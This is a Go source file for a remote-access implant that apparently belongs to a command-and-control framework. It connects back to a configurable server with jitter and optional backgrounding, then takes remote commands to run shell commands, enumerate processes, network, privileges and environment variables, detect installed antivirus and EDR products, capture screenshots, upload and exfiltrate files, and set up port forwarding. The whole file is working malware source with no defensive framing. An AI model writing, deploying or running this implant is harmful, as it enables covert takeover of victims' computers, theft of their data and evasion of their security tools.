package main

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"image/png"
	"io"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
)

const (
	MSG_COMMAND  = "cmd"
	MSG_RESPONSE = "resp"
	MSG_UPLOAD   = "upload"
	MSG_DOWNLOAD = "download"
	MSG_FILE     = "file"
	MSG_ERROR    = "error"
)

type Message struct {
	Type    string `json:"type"`
	Payload string `json:"payload"`
	Data    []byte `json:"data,omitempty"`
}

func sendMsg(conn net.Conn, msg Message) error {
	data, err := json.Marshal(msg)
	if err != nil {
		return err
	}
	length := make([]byte, 4)
	binary.BigEndian.PutUint32(length, uint32(len(data)))
	conn.Write(length)
	_, err = conn.Write(data)
	return err
}

func recvMsg(conn net.Conn) (Message, error) {
	lenBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lenBuf); err != nil {
		return Message{}, err
	}
	size := binary.BigEndian.Uint32(lenBuf)
	buf := make([]byte, size)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return Message{}, err
	}
	var msg Message
	err := json.Unmarshal(buf, &msg)
	return msg, err
}

func runShell(command string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("[!] Error: %s\n%s", err, string(out))
	}
	if len(out) == 0 {
		return "[*] Command completed (no output)\n"
	}
	return string(out)
}

func listDir(path string) string {
	entries, err := os.ReadDir(path)
	if err != nil {
		return fmt.Sprintf("[!] Error reading directory: %s\n", err)
	}
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("\n[*] Directory listing: %s\n", path))
	sb.WriteString(strings.Repeat("-", 60) + "\n")
	sb.WriteString(fmt.Sprintf("%-10s %-20s %-20s %s\n", "TYPE", "SIZE", "MODIFIED", "NAME"))
	sb.WriteString(strings.Repeat("-", 60) + "\n")
	for _, e := range entries {
		info, err := e.Info()
		if err != nil {
			continue
		}
		entryType := "FILE"
		if e.IsDir() {
			entryType = "DIR"
		}
		size := fmt.Sprintf("%d", info.Size())
		if e.IsDir() {
			size = "-"
		}
		sb.WriteString(fmt.Sprintf("%-10s %-20s %-20s %s\n",
			entryType, size,
			info.ModTime().Format("2006-01-02 15:04:05"),
			e.Name()))
	}
	sb.WriteString(fmt.Sprintf("\n[*] %d entries\n", len(entries)))
	return sb.String()
}

func getPS() string {
	var out string
	if runtime.GOOS == "windows" {
		out = runShell("tasklist /FO TABLE /NH")
	} else {
		out = runShell("ps aux")
	}
	return "[*] Process List:\n" + strings.Repeat("-", 60) + "\n" + out
}

func getNetstat() string {
	var out string
	if runtime.GOOS == "windows" {
		out = runShell("netstat -ano")
	} else {
		out = runShell("ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null")
	}
	return "[*] Network Connections:\n" + strings.Repeat("-", 60) + "\n" + out
}

func getSysInfo() string {
	hostname, _ := os.Hostname()
	cwd, _ := os.Getwd()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}
	var sb strings.Builder
	sb.WriteString("\n[*] System Information\n")
	sb.WriteString(strings.Repeat("-", 60) + "\n")
	sb.WriteString(fmt.Sprintf("  Hostname     : %s\n", hostname))
	sb.WriteString(fmt.Sprintf("  Username     : %s\n", username))
	sb.WriteString(fmt.Sprintf("  OS           : %s\n", runtime.GOOS))
	sb.WriteString(fmt.Sprintf("  Architecture : %s\n", runtime.GOARCH))
	sb.WriteString(fmt.Sprintf("  CPUs         : %d\n", runtime.NumCPU()))
	sb.WriteString(fmt.Sprintf("  Working Dir  : %s\n", cwd))
	sb.WriteString(strings.Repeat("-", 60) + "\n")
	if runtime.GOOS == "windows" {
		sb.WriteString(runShell("systeminfo | findstr /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" /C:\"Domain\""))
	} else {
		sb.WriteString(runShell("uname -a 2>/dev/null; id 2>/dev/null; cat /etc/os-release 2>/dev/null | head -5"))
	}
	return sb.String()
}

func getWhoami() string {
	var sb strings.Builder
	sb.WriteString("\n[*] Identity & Privileges\n")
	sb.WriteString(strings.Repeat("-", 60) + "\n")
	if runtime.GOOS == "windows" {
		sb.WriteString(runShell("whoami /all"))
	} else {
		sb.WriteString(runShell("id && echo '---' && sudo -l 2>/dev/null || echo '[*] sudo -l not available'"))
	}
	return sb.String()
}

func getARP() string {
	var out string
	if runtime.GOOS == "windows" {
		out = runShell("arp -a")
	} else {
		out = runShell("arp -n 2>/dev/null || ip neigh 2>/dev/null")
	}
	return "[*] ARP Cache:\n" + strings.Repeat("-", 60) + "\n" + out
}

func getEnv() string {
	var sb strings.Builder
	sb.WriteString("\n[*] Environment Variables\n")
	sb.WriteString(strings.Repeat("-", 60) + "\n")
	for _, e := range os.Environ() {
		sb.WriteString(e + "\n")
	}
	return sb.String()
}

func checkAV() string {
	avProcesses := []string{
		"MsMpEng", "msmpeng",
		"CylanceSvc",
		"cb", "cbdefense",
		"CSFalconService", "falcon",
		"SentinelAgent",
		"mbam", "malwarebytes",
		"avast", "avg",
		"mcshield",
		"bdagent",
		"savservice",
		"eset", "ekrn",
		"symantec", "ccsvchst",
		"clamd", "freshclam",
	}
	var sb strings.Builder
	sb.WriteString("\n[*] AV/EDR Detection\n")
	sb.WriteString(strings.Repeat("-", 60) + "\n")
	var psList string
	if runtime.GOOS == "windows" {
		psList = strings.ToLower(runShell("tasklist /FO CSV /NH"))
	} else {
		psList = strings.ToLower(runShell("ps aux"))
	}
	found := false
	for _, av := range avProcesses {
		if strings.Contains(psList, strings.ToLower(av)) {
			sb.WriteString(fmt.Sprintf("  [!] DETECTED: %s\n", av))
			found = true
		}
	}
	if !found {
		sb.WriteString("  [*] No known AV/EDR processes detected\n")
	}
	sb.WriteString(strings.Repeat("-", 60) + "\n")
	return sb.String()
}

func takeScreenshot() ([]byte, error) {
	n := screenshot.NumActiveDisplays()
	if n == 0 {
		return nil, fmt.Errorf("no active displays")
	}
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return nil, err
	}
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func handleRPortFwd(payload string) string {
	parts := strings.SplitN(payload, "|", 3)
	if len(parts) < 3 {
		return "[!] Invalid rportfwd params\n"
	}
	rPort, lHost, lPort := parts[0], parts[1], parts[2]
	listener, err := net.Listen("tcp", ":"+rPort)
	if err != nil {
		return fmt.Sprintf("[!] Failed to listen on port %s: %s\n", rPort, err)
	}
	go func() {
		defer listener.Close()
		for {
			conn, err := listener.Accept()
			if err != nil {
				return
			}
			go func(c net.Conn) {
				defer c.Close()
				target, err := net.Dial("tcp", lHost+":"+lPort)
				if err != nil {
					return
				}
				defer target.Close()
				go io.Copy(target, c)
				io.Copy(c, target)
			}(conn)
		}
	}()
	return fmt.Sprintf("[+] Remote port forward active: 0.0.0.0:%s -> %s:%s\n", rPort, lHost, lPort)
}

func daemonize() {
	if runtime.GOOS == "windows" {
		return
	}
	cmd := exec.Command(os.Args[0], os.Args[1:]...)
	cmd.Env = append(os.Environ(), "C2_DAEMON=1")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = nil, nil, nil
	cmd.Start()
	os.Exit(0)
}

func main() {
	host   := flag.String("host", "127.0.0.1", "Server IP")
	port   := flag.String("port", "4444", "Server port")
	retry  := flag.Int("retry", 0, "Retry attempts (0 = infinite)")
	sleep  := flag.Int("sleep", 3, "Base sleep seconds between retries")
	jitter := flag.Int("jitter", 2, "Max jitter seconds added to sleep")
	useTLS := flag.Bool("tls", false, "Use TLS (must match server)")
	daemon := flag.Bool("daemon", false, "Fork to background (Linux only)")
	flag.Parse()

	if *daemon && os.Getenv("C2_DAEMON") != "1" {
		daemonize()
	}

	addr := *host + ":" + *port
	var conn net.Conn
	var err error

	rand.Seed(time.Now().UnixNano())

	for attempt := 1; *retry == 0 || attempt <= *retry; attempt++ {
		if *useTLS {
			tlsCfg := &tls.Config{InsecureSkipVerify: true}
			conn, err = tls.Dial("tcp", addr, tlsCfg)
		} else {
			conn, err = net.Dial("tcp", addr)
		}
		if err == nil {
			break
		}
		delay := time.Duration(*sleep)*time.Second + time.Duration(rand.Intn(*jitter+1))*time.Second
		if *retry > 0 {
			fmt.Printf("[!] Failed (%d/%d), retrying in %v...\n", attempt, *retry, delay)
		}
		time.Sleep(delay)
	}

	if err != nil {
		os.Exit(1)
	}
	defer conn.Close()

	for {
		msg, err := recvMsg(conn)
		if err != nil {
			return
		}

		switch msg.Type {
		case MSG_COMMAND:
			p := msg.Payload
			switch {
			case p == "exit":
				return
			case strings.HasPrefix(p, "run "):
				sendMsg(conn, Message{Type: MSG_RESPONSE, Payload: runShell(strings.TrimPrefix(p, "run "))})
			case strings.HasPrefix(p, "ls "):
				sendMsg(conn, Message{Type: MSG_RESPONSE, Payload: listDir(strings.TrimPrefix(p, "ls "))})
			case p == "ps":
				sendMsg(conn, Message{Type: MSG_RESPONSE, Payload: getPS()})
			case p == "netstat":
				sendMsg(conn, Message{Type: MSG_RESPONSE, Payload: getNetstat()})
			case p == "sysinfo":
				sendMsg(conn, Message{Type: MSG_RESPONSE, Payload: getSysInfo()})
			case p == "whoami":
				sendMsg(conn, Message{Type: MSG_RESPONSE, Payload: getWhoami()})
			case p == "arp":
				sendMsg(conn, Message{Type: MSG_RESPONSE, Payload: getARP()})
			case p == "getenv":
				sendMsg(conn, Message{Type: MSG_RESPONSE, Payload: getEnv()})
			case p == "checkav":
				sendMsg(conn, Message{Type: MSG_RESPONSE, Payload: checkAV()})
			case p == "screenshot":
				data, err := takeScreenshot()
				if err != nil {
					sendMsg(conn, Message{Type: MSG_ERROR, Payload: err.Error()})
				} else {
					sendMsg(conn, Message{Type: MSG_RESPONSE, Data: data})
				}
			case p == "shell":
				sendMsg(conn, Message{Type: MSG_RESPONSE, Payload: "[+] Shell ready\n"})
			case strings.HasPrefix(p, "shellcmd "):
				sendMsg(conn, Message{Type: MSG_RESPONSE, Payload: runShell(strings.TrimPrefix(p, "shellcmd "))})
			case p == "shellexit":
				sendMsg(conn, Message{Type: MSG_RESPONSE, Payload: "[*] Shell closed\n"})
			case strings.HasPrefix(p, "rportfwd "):
				sendMsg(conn, Message{Type: MSG_RESPONSE, Payload: handleRPortFwd(strings.TrimPrefix(p, "rportfwd "))})
			case strings.HasPrefix(p, "sockstunnel "):
				target := strings.TrimPrefix(p, "sockstunnel ")
				remote, err := net.Dial("tcp", target)
				if err != nil {
					sendMsg(conn, Message{Type: MSG_ERROR, Payload: err.Error()})
				} else {
					sendMsg(conn, Message{Type: MSG_RESPONSE, Payload: "connected"})
					remote.Close()
				}
			case strings.HasPrefix(p, "portfwd "):
				target := strings.TrimPrefix(p, "portfwd ")
				remote, err := net.Dial("tcp", target)
				if err != nil {
					sendMsg(conn, Message{Type: MSG_ERROR, Payload: err.Error()})
				} else {
					sendMsg(conn, Message{Type: MSG_RESPONSE, Payload: "connected"})
					remote.Close()
				}
			case p == "socks":
				sendMsg(conn, Message{Type: MSG_RESPONSE, Payload: "[+] SOCKS ready\n"})
			}
		case MSG_DOWNLOAD:
			data, err := os.ReadFile(msg.Payload)
			if err != nil {
				sendMsg(conn, Message{Type: MSG_ERROR, Payload: err.Error()})
			} else {
				sendMsg(conn, Message{Type: MSG_FILE, Payload: msg.Payload, Data: data})
			}
		case MSG_UPLOAD:
			err := os.WriteFile(msg.Payload, msg.Data, 0644)
			if err != nil {
				sendMsg(conn, Message{Type: MSG_ERROR, Payload: err.Error()})
			} else {
				sendMsg(conn, Message{Type: MSG_RESPONSE,
					Payload: fmt.Sprintf("[+] File written: %s (%d bytes)\n", msg.Payload, len(msg.Data))})
			}
		}
	}
}
